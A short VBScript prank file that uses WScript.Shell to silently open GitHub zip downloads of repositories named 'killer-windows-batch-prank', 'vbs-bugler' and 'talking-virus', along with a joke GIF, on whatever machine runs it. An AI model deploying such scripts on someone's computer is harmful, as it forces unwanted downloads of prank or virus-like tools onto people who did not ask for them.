Option Explicit

Dim objWshShell

Set objWshShell = WScript.CreateObject("WScript.Shell")
objWshShell.Run "https://codeload.github.com/zimus117/killer-windows-batch-prank/zip/master", 1, False
objWshShell.Run "https://codeload.github.com/zimus117/vbs-bugler/zip/master", 1, False
objWshShell.Run "https://codeload.github.com/zimus117/talking-virus/zip/master", 1, False
objWshShell.Run "http://media.tumblr.com/60457d37db6fa740636ed9028a181c29/tumblr_inline_mrcsqdv6ll1qz4rgp.gif", 1, False
Set objWshShell = Nothing

WScript.Quit 0
